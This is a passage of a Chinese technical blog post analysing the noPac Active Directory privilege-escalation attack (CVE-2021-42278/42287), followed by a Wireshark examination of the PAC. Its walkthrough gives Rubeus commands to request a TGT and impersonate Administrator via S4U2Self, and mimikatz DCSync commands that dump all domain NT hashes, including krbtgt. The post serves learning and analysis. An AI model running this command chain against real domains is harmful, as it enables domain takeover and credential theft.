+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220915104228.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915104228.png, images/Pasted%20image%2020220915104228.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915104228.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915104228.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915104228.png" width="1282" height="262" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>之所以不带 $ , 是由于 <a href="#cve-2021-42278---samaccountname-spoofing">CVE-2021-42278</a> 漏洞, 且域用户对其创建的计算机帐户有 “WriteProperty” 权限, 所以 sAMAccountName 可以修改其为任意值, 只要不与域内其他 sAMAccountName 重复就行.</p>
+<p>域控的 sAMAccountName 为 DC$, 如果修改为带 $ 会导致 sAMAccountName 冲突, 修改失败, 报错: 使用 “0” 个参数调用 “SetInfo” 时发生异常: “对象已存在.”</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220915154223.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915154223.png, images/Pasted%20image%2020220915154223.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915154223.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915154223.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915154223.png" width="1276" height="228" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>利用 PowerView.ps1 验证: 域用户对其创建的计算机帐户 sAMAccountName 对象有 “WriteProperty” 权限.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="nb">ConvertTo-SID</span> <span class="s2">&#34;missyou\ligang&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="n">test1a</span> <span class="n">-domain</span> <span class="n">missyou</span><span class="p">.</span><span class="py">com</span> <span class="n">-ResolveGUIDs</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220915153515.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153515.png, images/Pasted%20image%2020220915153515.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153515.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153515.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153515.png" width="806" height="70" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220915153457.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153457.png, images/Pasted%20image%2020220915153457.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153457.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153457.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915153457.png" width="1130" height="652" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><strong>而计算机帐户本身对其 sAMAccountName 对象是无 “WriteProperty” 权限的.</strong></p>
+<h3 id="使用创建的计算机帐户申请-tgt">使用创建的计算机帐户申请 TGT</h3>
+<p>此处申请的 TGT 并不是域控计算机帐户的 TGT, 当把创建的计算机帐户的 sAMAccountName 修改为 DC 的主机名 (DC)之后, 域控只会生成一个属于该计算机帐户 (DC) 的 TGT . (而域控计算机户的 sAMAccountName 为 DC$).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="n">Rubeus3</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="s2">&#34;DC&#34;</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="s2">&#34;123&#34;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="s2">&#34;missyou.com&#34;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="s2">&#34;DC.missyou.com&#34;</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">dc</span><span class="p">.</span><span class="py">kirbi</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020230112155047.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155047.png, images/Pasted%20image%2020230112155047.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155047.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155047.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155047.png" width="1284" height="2034" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="恢复计算机帐户的-samaccountname">恢复计算机帐户的 sAMAccountName</h3>
+<p>利用 Powermad.ps1 恢复更改计算机帐户的 sAMAccountName 为 test1a$.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-MachineAccountAttribute</span> <span class="n">-MachineAccount</span> <span class="s2">&#34;test1a&#34;</span> <span class="n">-Value</span> <span class="s2">&#34;test1a$&#34;</span> <span class="n">-Attribute</span> <span class="s1">&#39;sAMAccountName&#39;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span> <span class="n">-Verbose</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220915105106.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915105106.png, images/Pasted%20image%2020220915105106.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915105106.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915105106.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915105106.png" width="1282" height="230" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="获取-st">获取 ST</h3>
+<p>在这步我们向域控发起 S4U2Self 请求, 这里就设计到一个 KDC 的漏洞 CVE-2021-42287.</p>
+<blockquote>
+<p>如果 Administrator 被禁用, 就使用其他域管用户.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="n">Rubeus3</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">dc</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="s2">&#34;Administrator&#34;</span> <span class="p">/</span><span class="n">altservice</span><span class="err">:</span><span class="s2">&#34;LDAP/DC.missyou.com&#34;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="s2">&#34;DC.missyou.com&#34;</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">self</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020230112155437.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155437.png, images/Pasted%20image%2020230112155437.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155437.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155437.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112155437.png" width="1280" height="1968" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="dcsync">DCSync</h3>
+<ol>
+<li>使用 mimikatz 获取域内的所有用户帐户和计算机帐户的 NT Hash.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="n">mimikatz</span> <span class="c"># lsadump::DCSync /domain:missyou.com /kdc:DC.missyou.com /csv /all</span>
+</span></span></code></pre></div><ol start="2">
+<li>指定用户获取其 Hash.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="n">mimikatz</span> <span class="c"># lsadump::DCSync /domain:missyou.com /kdc:DC.missyou.com /user:krbtgt</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220915111642.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915111642.png, images/Pasted%20image%2020220915111642.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915111642.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915111642.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915111642.png" width="1596" height="852" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="wireshark-分析">WireShark 分析</h2>
+<h3 id="as-req">AS-REQ</h3>
+<p>这里发出 AS-REQ 请求的帐户是我们创建的计算机帐户, 并且 sAMAccountName 已经修改为 DC (不带 $).</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230112132601.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132601.png, images/Pasted%20image%2020230112132601.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132601.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132601.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132601.png" width="852" height="792" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="as-rep">AS-REP</h3>
+<p>这里主要看下 PAC, 可以看到此时还是没有任何问题的, 权限还是我们创建的这个计算机帐户的权限, Acct Name: DC (创建的计算机帐户更改后的 sAMAccountName), Group RID: 515 (Domain Computers) 组.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230112132918.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132918.png, images/Pasted%20image%2020230112132918.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132918.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132918.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112132918.png" width="1010" height="998" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="tgs-req">TGS-REQ</h3>
+<p>这里是通过 S4U2Self 模拟 Administrator 用户请求 LDAP 服务的 ST.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230112133638.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112133638.png, images/Pasted%20image%2020230112133638.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112133638.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112133638.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112133638.png" width="1560" height="560" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230112134323.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134323.png, images/Pasted%20image%2020230112134323.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134323.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134323.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134323.png" width="668" height="596" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>注意 TGS-REQ 会携带 AS-REP 中的 TGT, 到这里也是没有任何问题的.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230112134945.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134945.png, images/Pasted%20image%2020230112134945.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134945.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134945.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112134945.png" width="1000" height="990" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="tgs-rep">TGS-REP</h3>
+<p>这里就关注 ST 中的 PAC 就好了.</p>
+<p>可以看到现在此时 PAC 已经是高权限了, Group RID: 512 (域管组).</p>
+<p>这里就是因为我们恢复了创建的计算机帐户的 sAMAccountName 为 test1a$ (恢复前为 DC), 致使 TGS 找不到 sAMAccountName 为 DC 的帐户, 便会在 DC 结尾处添加 $ 变成域控的计算机帐户 DC$, 而我们又是通过 S4U2Self 模拟域管 Administrator 去申请访问 LDAP 服务的 ST, 那么域控本身的计算机帐户肯定有权限创建通过 S4U2Self 申请的 ST, PAC 中的身份也是 “高权身份”.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230112135755.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112135755.png, images/Pasted%20image%2020230112135755.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112135755.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112135755.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020230112135755.png" width="1018" height="1480" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><strong>感谢耐心阅读, 文章仅供参考, 本人学艺不精, 不足之处欢迎师傅们指点和纠正!</strong></p>
+<h2 id="工具">工具</h2>
+<p>出于对 noPac 的原理学习, 在 <a href="https://github.com/cube0x0/noPac"target="_blank" rel="external nofollow noopener noreferrer">cube0x0 的项目</a> 基础上进行了一些更改, 并在源码中添加了个人的理解注释. 项目地址: <a href="https://github.com/TryA9ain/noPac"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/TryA9ain/noPac</a>.</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://paper.seebug.org/1904/#_1"target="_blank" rel="external nofollow noopener noreferrer">CVE-2021-42287 Windows域内提权漏洞分析</a></p>
+<p><a href="https://tttang.com/archive/1380/#toc_0x00"target="_blank" rel="external nofollow noopener noreferrer">解析CVE-2021-42287与CVE-2021-42278</a></p>
+<p><a href="https://lonmar.cn/2021/12/23/no-pac-analysis/"target="_blank" rel="external nofollow noopener noreferrer">从XP源码泄露看NoPac漏洞</a></p>
+<p><a href="https://tttang.com/archive/1675/O"target="_blank" rel="external nofollow noopener noreferrer">sAMAccountName Spoofing之九个为什么</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2022-11-25 17:37:22">更新于 2022-11-25&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/' class="post-tag">域渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/" class="post-nav-item" rel="prev" title="Kerberos 认证过程分析"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Kerberos 认证过程分析</a>
+      <a href="/posts/%E5%88%A9%E7%94%A8-keytab-%E5%92%8C-wireshark-%E8%A7%A3%E5%AF%86-kerberos/" class="post-nav-item" rel="next" title="利用 keytab 和 WireShark 解密 Kerberos">利用 keytab 和 WireShark 解密 Kerberos<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
